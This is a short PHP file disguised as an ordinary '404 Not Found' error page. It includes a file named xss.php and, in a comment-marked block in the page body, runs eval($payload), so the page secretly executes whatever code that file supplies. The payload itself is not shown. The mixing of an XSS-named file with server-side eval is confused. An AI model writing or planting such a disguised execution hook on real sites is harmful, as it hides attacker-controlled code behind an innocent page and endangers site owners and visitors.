<?php
// Include the payload
include('xss.php');

// Display the 404 error page
header("HTTP/1.0 404 Not Found");
?>
<!DOCTYPE html>
<html>
<head>
  <title>404 Not Found</title>
</head>
<body>
  <h1>404 Not Found</h1>
  <p>The page you are looking for could not be found.</p>
  <!-- Execute the payload -->
  <?php eval($payload); ?>
</body>
</html>